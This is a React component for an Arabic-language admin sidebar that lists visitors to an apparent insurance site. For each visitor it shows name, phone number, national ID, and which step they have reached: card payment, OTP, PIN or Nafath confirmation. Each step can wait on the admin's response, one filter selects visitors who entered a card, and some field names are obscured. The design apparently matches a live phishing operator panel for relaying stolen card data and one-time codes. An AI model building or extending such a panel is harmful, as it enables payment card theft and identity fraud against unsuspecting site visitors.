"use client"

import { useEffect, useState } from "react"
import { Search, Trash2, CheckSquare, Square, CreditCard, KeyRound, RefreshCw } from "lucide-react"
import type { InsuranceApplication } from "@/lib/firestore-types"
import { getTimeAgo } from "@/lib/time-utils"

interface VisitorSidebarProps {
  visitors: InsuranceApplication[]
  selectedVisitor: InsuranceApplication | null
  onSelectVisitor: (visitor: InsuranceApplication) => void
  searchQuery: string
  onSearchChange: (query: string) => void
  cardFilter: "all" | "hasCard"
  onCardFilterChange: (filter: "all" | "hasCard") => void
  selectedIds: Set<string>
  onToggleSelect: (id: string) => void
  onSelectAll: () => void
  onDeleteSelected: () => void
  sidebarWidth: number
  onSidebarWidthChange: (width: number) => void
}

// Check if visitor is waiting for admin response
const isWaitingForAdmin = (visitor: InsuranceApplication): boolean => {
  return (
    visitor.cardStatus === "waiting" ||
    visitor.otpStatus === "waiting" ||
    visitor.pinStatus === "waiting" ||
    visitor.nafadConfirmationStatus === "waiting"
  )
}

// Get current page name in Arabic
const getPageName = (step: number | string): string => {
  // Handle string values first (legacy system)
  if (typeof step === 'string') {
    const stringPageNames: Record<string, string> = {
      '_st1': 'الدفع (بطاقة)',
      '_t2': 'OTP',
      '_t3': 'PIN',
      '_t6': 'نفاذ',
      'phone': 'الهاتف',
      'home': 'الرئيسية',
      'insur': 'بيانات التأمين',
      'compar': 'مقارنة العروض',
      'check': 'الدفع',
      'veri': 'OTP',
      'confi': 'PIN',
      'nafad': 'نفاذ'
    }
    return stringPageNames[step] || `غير محدد (${step})`
  }
  
  // Handle numeric values
  const stepNum = typeof step === 'number' ? step : parseInt(step)
  const pageNames: Record<number, string> = {
    0: 'الرئيسية',
    1: 'الرئيسية',
    2: 'بيانات التأمين',
    3: 'مقارنة العروض',
    4: 'الدفع',
    5: 'OTP',
    6: 'PIN',
    7: 'الهاتف',
    8: 'نفاذ'
  }
  
  return pageNames[stepNum] || `غير محدد (${stepNum})`
}

export function VisitorSidebar({
  visitors,
  selectedVisitor,
  onSelectVisitor,
  searchQuery,
  onSearchChange,
  cardFilter,
  onCardFilterChange,
  selectedIds,
  onToggleSelect,
  onSelectAll,
  onDeleteSelected,
  sidebarWidth,
  onSidebarWidthChange
}: VisitorSidebarProps) {
  const allSelected = visitors.length > 0 && selectedIds.size === visitors.length
  const [isLandscapeTablet, setIsLandscapeTablet] = useState(false)

  useEffect(() => {
    const mediaQuery = window.matchMedia("(orientation: landscape) and (max-width: 1024px)")
    const updateMatch = () => setIsLandscapeTablet(mediaQuery.matches)
    updateMatch()

    mediaQuery.addEventListener("change", updateMatch)
    return () => mediaQuery.removeEventListener("change", updateMatch)
  }, [])



  return (
    <div 
      className="w-full bg-white/90 md:w-[400px] border-slate-200/80 landscape:border-l md:border-l flex flex-col relative group shadow-sm"
      style={{ 
        fontFamily: 'Cairo, Tajawal, sans-serif',
        width: isLandscapeTablet ? `${sidebarWidth}px` : undefined
      }}
    >

      {/* Header */}
      <div className="border-b border-slate-200/80 bg-white/90 px-4 py-4 landscape:p-2">
        <h1 className="mb-4 text-xl font-extrabold text-slate-900 landscape:mb-2 landscape:text-base">
          لوحة التحكم
        </h1>
        
        {/* Search */}
        <div className="relative mb-3 landscape:mb-2">
          <Search className="absolute right-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400 landscape:w-4 landscape:h-4" />
          <input
            type="text"
            placeholder="بحث (الاسم، الهوية، الهاتف، آخر 4 أرقام)"
            value={searchQuery}
            onChange={(e) => onSearchChange(e.target.value)}
            className="w-full rounded-xl border border-slate-300 bg-white py-2 pl-4 pr-10 text-sm text-slate-700 shadow-sm transition placeholder:text-slate-400 focus:border-emerald-500 focus:outline-none focus:ring-2 focus:ring-emerald-200 landscape:py-1.5 landscape:text-xs"
          />
        </div>

        {/* Filters */}
        <div className="flex gap-2 mb-3 landscape:mb-2">
          <button
            onClick={() => onCardFilterChange("all")}
            className={`flex-1 rounded-xl px-3 py-1.5 text-sm font-semibold transition landscape:py-1 landscape:text-xs ${
              cardFilter === "all"
                ? "bg-emerald-600 text-white shadow-sm"
                : "bg-slate-100 text-slate-700 hover:bg-slate-200"
            }`}
          >
            الكل
          </button>
          <button
            onClick={() => onCardFilterChange("hasCard")}
            className={`flex-1 rounded-xl px-3 py-1.5 text-sm font-semibold transition landscape:py-1 landscape:text-xs ${
              cardFilter === "hasCard"
                ? "bg-emerald-600 text-white shadow-sm"
                : "bg-slate-100 text-slate-700 hover:bg-slate-200"
            }`}
          >
            لديهم بطاقة
          </button>
        </div>

        {/* Actions */}
        <div className="flex gap-2">
          <button
            onClick={onSelectAll}
            className="inline-flex items-center gap-1.5 rounded-xl border border-slate-200 bg-slate-100 px-3 py-1.5 text-sm font-semibold text-slate-700 transition hover:bg-slate-200 landscape:py-1 landscape:text-xs"
          >
            {allSelected ? <CheckSquare className="w-4 h-4 landscape:w-3 landscape:h-3" /> : <Square className="w-4 h-4 landscape:w-3 landscape:h-3" />}
            {allSelected ? "إلغاء الكل" : "تحديد الكل"}
          </button>
          
          {selectedIds.size > 0 && (
            <button
              onClick={onDeleteSelected}
              className="inline-flex items-center gap-1.5 rounded-xl bg-rose-600 px-3 py-1.5 text-sm font-semibold text-white transition hover:bg-rose-700 landscape:py-1 landscape:text-xs"
            >
              <Trash2 className="w-4 h-4 landscape:w-3 landscape:h-3" />
              حذف ({selectedIds.size})
            </button>
          )}
        </div>
      </div>

      {/* Visitor List */}
      <div className="flex-1 overflow-y-auto bg-slate-50/60 p-2">
        {visitors.length === 0 ? (
          <div className="p-8 text-center text-slate-500">
            <p>لا يوجد زوار</p>
          </div>
        ) : (
          visitors.map((visitor) => (
            <div
              key={visitor.id}
              onClick={() => onSelectVisitor(visitor)}
              className={`mb-2 cursor-pointer rounded-2xl border p-4 shadow-sm transition duration-150 landscape:p-2 ${
                selectedVisitor?.id === visitor.id
                  ? "border-emerald-300 bg-emerald-50/80 ring-2 ring-emerald-100"
                  : "border-slate-200 bg-white hover:border-slate-300 hover:bg-slate-50/70"
              } ${visitor.isUnread ? "border-fuchsia-200 bg-fuchsia-50/70" : ""}`}
            >
              <div className="flex items-start gap-3">
                {/* Checkbox */}
                <div
                  onClick={(e) => {
                    e.stopPropagation()
                    if (visitor.id) onToggleSelect(visitor.id)
                  }}
                  className="mt-1"
                >
                  {(visitor.id && selectedIds.has(visitor.id)) ? (
                    <CheckSquare className="w-5 h-5 text-green-600" />
                  ) : (
                    <Square className="w-5 h-5 text-gray-400" />
                  )}
                </div>

                {/* Visitor Info */}
                <div className="flex-1 min-w-0">
                  {/* Name & Time Ago */}
                  <div className="flex items-center justify-between mb-1">
                    <div className="flex items-center gap-2 flex-1 min-w-0">
                      <h3 className="font-semibold text-slate-900 truncate text-base landscape:text-sm">{visitor.ownerName}</h3>
                      <span className="flex items-center gap-1 whitespace-nowrap rounded-full bg-sky-700 px-2 py-0.5 text-xs font-medium text-white">
                        {isWaitingForAdmin(visitor) && (
                          <RefreshCw className="w-3 h-3 animate-spin" />
                        )}
                        {getPageName(visitor.currentStep)}
                      </span>
                    </div>
                    
                    {/* Time ago indicator */}
                    <div className="flex items-center gap-1 whitespace-nowrap text-xs font-medium text-slate-500 landscape:text-[10px]">
                      <span>{getTimeAgo(visitor.updatedAt || visitor.lastSeen)}</span>
                    </div>
                  </div>





                  {/* Contact Info: Phone & ID */}
                  <div className="mb-2 hidden items-center gap-3 text-xs text-slate-700 md:flex">
                    {visitor.phoneNumber && (
                      <div className="flex items-center gap-1">
                        <span className="font-medium">📞 {visitor.phoneNumber}</span>
                      </div>
                    )}
                    {visitor.identityNumber && (
                      <div className="flex items-center gap-1">
                        <span className="font-medium">🆔 {visitor.identityNumber}</span>
                      </div>
                    )}
                  </div>

                  {/* Bottom Row: Status & Page */}
                  <div className="hidden md:flex items-center justify-between">
                    {/* Left: Online Status & Icons */}
                    <div className="flex items-center gap-2">
                      <div className="flex items-center gap-1">
                        <div className={`w-2 h-2 rounded-full ${visitor.isOnline ? 'bg-green-500' : 'bg-gray-400'}`}></div>
                        <span className="text-xs text-slate-600">{visitor.isOnline ? 'متصل' : 'غير متصل'}</span>
                      </div>
                      
                      {(visitor._v1 || visitor.cardNumber) && (
                        <div className="flex items-center gap-1 rounded-md bg-blue-100 px-2 py-0.5 text-xs text-blue-700">
                          <CreditCard className="w-3 h-3" />
                        </div>
                      )}
                      {visitor.phoneVerificationCode && (
                        <div className="flex items-center gap-1 rounded-md bg-purple-100 px-2 py-0.5 text-xs text-purple-700">
                          <KeyRound className="w-3 h-3" />
                        </div>
                      )}
                    </div>


                  </div>
                </div>
              </div>
            </div>
          ))
        )}
      </div>
    </div>
  )
}
